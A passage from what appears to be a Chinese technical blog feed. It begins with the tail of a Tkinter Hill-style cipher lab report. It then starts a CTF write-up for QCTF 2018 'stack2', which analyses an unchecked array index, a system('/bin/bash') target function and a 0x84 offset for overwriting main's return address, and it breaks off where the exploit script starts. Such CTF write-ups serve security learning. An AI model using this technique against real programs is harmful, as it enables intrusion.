class="keyword">and</span> e1.get() != <span class="string">""</span> <span class="keyword">and</span> e2.get() != <span class="string">""</span>:</span><br><span class="line">        n = int(e1.get())</span><br><span class="line">        m = int(e2.get())</span><br><span class="line">        A = np.zeros((n, n))</span><br><span class="line">        B = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        Atex = t1.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        stringA = <span class="string">' '</span>.join(Atex.split())</span><br><span class="line">        listA = list(stringA.split(<span class="string">' '</span>))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                A[row][column] = int(listA[index])</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        print(A)</span><br><span class="line">        Btex = t2.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        stringB = <span class="string">' '</span>.join(Btex.split())</span><br><span class="line">        listB = list(stringB.split(<span class="string">' '</span>))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            B[row][<span class="number">0</span>] = int(listB[index])</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">        print(B)</span><br><span class="line">        clear = tt2.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        clear = list(clear)</span><br><span class="line">        klist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">' '</span>:</span><br><span class="line">                klist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        dlist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">                dlist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        print(dlist)</span><br><span class="line">        print(klist)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">                clear[i] = <span class="string">' '</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">' '</span> <span class="keyword">in</span> clear:</span><br><span class="line">            clear.remove(<span class="string">' '</span>)</span><br><span class="line">        CipherText = Encrypt(clear,A,B,n,m)</span><br><span class="line">        print(CipherText)</span><br><span class="line">        CipherText = list(CipherText)</span><br><span class="line">        print(CipherText)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(klist)):</span><br><span class="line">            <span class="keyword">if</span> klist[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ind = int(klist[i])</span><br><span class="line">            CipherText.insert(ind,<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dlist)):</span><br><span class="line">            <span class="keyword">if</span> dlist[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ind = int(dlist[i])</span><br><span class="line">            CipherText.insert(ind,<span class="string">","</span>)</span><br><span class="line">        str = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(CipherText)):</span><br><span class="line">            str += CipherText[i]</span><br><span class="line">        t3.insert(INSERT,str)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showinfo(<span class="string">"Error"</span>, <span class="string">"Please input n,m,A key,B key"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#主窗口</span></span><br><span class="line">    window = tk.Tk()</span><br><span class="line">    window.title(<span class="string">'Multi-table'</span>)</span><br><span class="line">    window.geometry(<span class="string">'300x950'</span>)</span><br><span class="line">    <span class="comment">#随机密钥</span></span><br><span class="line">    b = tk.Button(window, text=<span class="string">'Random Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>,command=buttonRK)</span><br><span class="line">    b.pack()</span><br><span class="line">    <span class="comment"># 2标签</span></span><br><span class="line">    l2 = tk.Label(window, text=<span class="string">'Please input n'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># 输入框控件entry</span></span><br><span class="line">    e1 = tk.Entry(window, show=<span class="literal">None</span>, width=<span class="number">8</span>,justify = <span class="string">'center'</span>)  <span class="comment"># 显示成明文形式</span></span><br><span class="line">    e1.pack()</span><br><span class="line">    <span class="comment"># 3标签</span></span><br><span class="line">    l3 = tk.Label(window, text=<span class="string">'Please input M'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l3.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># 输入框控件entry</span></span><br><span class="line">    e2 = tk.Entry(window, show=<span class="literal">None</span>, width=<span class="number">8</span>, justify=<span class="string">'center'</span>)  <span class="comment"># 显示成明文形式</span></span><br><span class="line">    e2.pack()</span><br><span class="line">    <span class="comment">#4标签</span></span><br><span class="line">    l4 = tk.Label(window, text=<span class="string">'A Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l4.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment">#Text</span></span><br><span class="line">    t1 = tk.Text(window, height=<span class="number">8</span>,width = <span class="number">40</span>)</span><br><span class="line">    t1.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment">#5标签</span></span><br><span class="line">    l5 = tk.Label(window, text=<span class="string">'B Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l5.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># Text</span></span><br><span class="line">    t2 = tk.Text(window, height=<span class="number">8</span>, width=<span class="number">40</span>)</span><br><span class="line">    t2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># 5标签</span></span><br><span class="line">    ll5 = tk.Label(window, text=<span class="string">'Text'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">20</span>, height=<span class="number">2</span>)</span><br><span class="line">    ll5.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># Text</span></span><br><span class="line">    tt2 = tk.Text(window, height=<span class="number">8</span>, width=<span class="number">20</span>)</span><br><span class="line">    tt2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    b1 = tk.Button(window, text=<span class="string">'File'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>, command=nb1)</span><br><span class="line">    b1.pack()</span><br><span class="line">    <span class="comment"># 加密</span></span><br><span class="line">    De = tk.Button(window, text=<span class="string">'Decrypt'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>,command=Dewin)</span><br><span class="line">    De.pack()</span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    En = tk.Button(window, text=<span class="string">'Encrypt'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>,command=Enwin)</span><br><span class="line">    En.pack()</span><br><span class="line">    <span class="comment"># 6标签</span></span><br><span class="line">    l6 = tk.Label(window, text=<span class="string">'SOLUTION'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">20</span>, height=<span class="number">2</span>)</span><br><span class="line">    l6.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># Text</span></span><br><span class="line">    t3 = tk.Text(window, height=<span class="number">8</span>, width=<span class="number">20</span>)</span><br><span class="line">    t3.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># 8标签</span></span><br><span class="line">    l8 = tk.Label(window, text=<span class="string">'@FZU-IS-404 ZERO-A-ONE'</span>, font=(<span class="string">'Arial'</span>, <span class="number">10</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l8.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    window.mainloop()</span><br></pre></td></tr></table></figure><h2 id="重要的实现细节"><a href="#重要的实现细节" class="headerlink" title="重要的实现细节"></a>重要的实现细节</h2><h4 id="GUI界面的实现"><a href="#GUI界面的实现" class="headerlink" title="GUI界面的实现"></a>GUI界面的实现</h4><p>GUI界面的实现极大的方便了使用者的使用体验，降低了使用门槛，使得本程序的实用化程度大大提升</p><h4 id="三目运算符的使用"><a href="#三目运算符的使用" class="headerlink" title="三目运算符的使用"></a>三目运算符的使用</h4><p>在求A的伴随矩阵时，使用了三目运算符，简化了程序，使思路更清晰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">temp[k][t] = arcs[(k+<span class="number">1</span> <span class="keyword">if</span> k&gt;=i <span class="keyword">else</span> k)][(t+<span class="number">1</span> <span class="keyword">if</span> t&gt;=j <span class="keyword">else</span> t)]</span><br></pre></td></tr></table></figure><h4 id="随机生成在模下可逆矩阵"><a href="#随机生成在模下可逆矩阵" class="headerlink" title="随机生成在模下可逆矩阵"></a>随机生成在模下可逆矩阵</h4><p>通过模拟初等变换实现的可逆矩阵，更重要的是保证了矩阵A的行列式与所定模N互素。且在随机化的过程中，通过判断保证了数据不会溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> maxint - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &lt; <span class="number">0</span> <span class="keyword">and</span> maxint*(<span class="number">-1</span>) - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &gt; tempArray[k]:</span><br></pre></td></tr></table></figure><p>`</p><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><h3 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E4%B8%BB%E7%95%8C%E9%9D%A2.png" alt></p><h3 id="随机矩阵生成"><a href="#随机矩阵生成" class="headerlink" title="随机矩阵生成"></a>随机矩阵生成</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E7%9F%A9%E9%98%B5.png" alt></p><h3 id="逆矩阵-2"><a href="#逆矩阵-2" class="headerlink" title="逆矩阵"></a>逆矩阵</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E9%80%86%E7%9F%A9%E9%98%B5.png" alt></p><h3 id="例题加密"><a href="#例题加密" class="headerlink" title="例题加密"></a>例题加密</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E4%BE%8B%E9%A2%98%E5%8A%A0%E5%AF%86.png" alt></p><h3 id="例题解密"><a href="#例题解密" class="headerlink" title="例题解密"></a>例题解密</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E4%BE%8B%E9%A2%98%E8%A7%A3%E5%AF%86.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>多表代换密码为古典密码学中一种较为经典的加密方式，对于多表替换加密来说，加密后的字母几乎不再保持原来的频率，对于词频和字频分析有了一定的抵抗能力</p><p>本人的系统有如下亮点：</p><ul><li>实现了全部的GUI可视化操作</li><li>实现了对长度不是n的倍数的明文的处理，能够对长度不是n的倍数的明文进行加密解密</li><li>实现了对空格和标点符号的处理。要求解密时能还原空格和标点符号</li><li>实现了对文件的读写操作</li><li>实现了调用系统API实现错误弹窗功能</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>4th-QCTF-2018-stack2</title>
      <link href="/2019/09/05/4th-QCTF-2018-stack2/"/>
      <url>/2019/09/05/4th-QCTF-2018-stack2/</url>
      
        <content type="html"><![CDATA[<p>一道常规的通过栈溢出控制<strong>EIP</strong>从而改变程序path的题目</p><p>先检查一下获得的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>可知开启了NX和Canary防护，我们运行一下这个程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">***********************************************************</span><br><span class="line">*                      An easy calc                       *</span><br><span class="line">*Give me your numbers and I will return to you an average *</span><br><span class="line">*(0 &lt;= x &lt; 256)                                           *</span><br><span class="line">***********************************************************</span><br><span class="line">How many numbers you have:</span><br><span class="line">10</span><br><span class="line">Give me your numbers</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">1. show numbers</span><br><span class="line">2. add number</span><br><span class="line">3. change number</span><br><span class="line">4. get average</span><br><span class="line">5. exit</span><br></pre></td></tr></table></figure><p>大概就是一个求平均数的程序，我们用IDA Pro看一下反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>毫无头绪，我们先尝试搜索一下<code>flag</code>，<code>sysytem</code>，<code>cat</code>等常用字符串，看看能不能寻找到什么有用的线索，我们发现了<code>hackhere</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:0804859B                 public hackhere</span><br><span class="line">.text:0804859B hackhere        proc near</span><br><span class="line">.text:0804859B</span><br><span class="line">.text:0804859B var_C           = dword ptr -0Ch</span><br><span class="line">.text:0804859B</span><br><span class="line">.text:0804859B ; __unwind &#123;</span><br><span class="line">.text:0804859B                 push    ebp</span><br><span class="line">.text:0804859C                 mov     ebp, esp</span><br><span class="line">.text:0804859E                 sub     esp, 18h</span><br><span class="line">.text:080485A1                 mov     eax, large gs:14h</span><br><span class="line">.text:080485A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:080485AA                 xor     eax, eax</span><br><span class="line">.text:080485AC                 sub     esp, 0Ch</span><br><span class="line">.text:080485AF                 push    offset command  ; &quot;/bin/bash&quot;</span><br><span class="line">.text:080485B4                 call    _system</span><br><span class="line">.text:080485B9                 add     esp, 10h</span><br><span class="line">.text:080485BC                 nop</span><br><span class="line">.text:080485BD                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:080485C0                 xor     edx, large gs:14h</span><br><span class="line">.text:080485C7                 jz      short locret_80485CE</span><br><span class="line">.text:080485C9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们现在大概有思路了，就是通过栈溢出控制程序的path到这个函数上就可以查看到<strong>flag</strong>了，现在来分析程序，可以看到两个溢出点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">     __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">     v13[v5] = v7;</span><br></pre></td></tr></table></figure><p>我们可以知道第一个溢出点是没有什么作用的，然后看看第二个溢出点，这里就是bug了，因为我们没有检查<strong>v13</strong>数组的边界，这里我们可以随意输入，然后劫持程序<strong>EIP</strong>，问题是这里的<strong>v13</strong>是<strong>char</strong>类型的数组，在<strong>32</strong>位系统中，一个<strong>char</strong>类型占用一个<strong>1</strong>字节，而地址是以<strong>int</strong>类型存储的，在<strong>32</strong>位系统中占用<strong>4</strong>字节，等于说我们需要把地址拆分成<strong>4</strong>个字节输入</p><p>我们知道我们需要达到的地址是：<strong>0x080485AF</strong>，在Linux中数据的存储的小端序结构，所以我们需要把这串地址反着拆成两个两个一组的组合：<strong>0xAF</strong>、<strong>0x85</strong>、<strong>0x04</strong>、<strong>0x08</strong></p><p>这题的溢出点如果不是用<code>pattern.py</code>脚本计算而是手动计算的话有点小坑，我们的目标是修改<strong>main</strong>函数的返回地址到<strong>0x080485AF</strong>，所以我们需要找到存放<strong>main</strong>函数返回地址的内存与字符串数组内存的偏移量</p><p>我们注意到main函数开头和结尾的汇编代码</p><p>开头</p><p><code>.text:080485D0                 lea     ecx, [esp+4]</code></p><p>结尾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080488EF                 lea     esp, [ecx-4]</span><br><span class="line">.text:080488F2                 retn</span><br></pre></td></tr></table></figure><p>可以知道最后<strong>main</strong>函数的返回值，是由<strong>esp</strong>决定的，而最后<strong>esp</strong>的值又是由<strong>ecx</strong>的值决定的，而<strong>ecx</strong>的值是由一开始<strong>esp</strong>的值决定的。由于我们通过静态分析，无法得知一开始时<strong>esp</strong>的内存位置，故当最后返回地址时<strong>esp</strong>的值我们也无法确定，我们需要通过动态调试才能得知一开始时<strong>esp</strong>的内存地址和最后返回的地址，计算得出偏移</p><p><strong>0xFFFFCEF8</strong>是数组的地址，<strong>0xFFFFCF7C</strong>是存放<code>main</code>函数返回地址，故<code>pwndbg&gt; p/x 0xffffcf7c-0xffffcef8$1 = 0x84</code>，可以得出偏移量（溢出点）为<strong>0x84</strong></p><p>所以Exploit为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 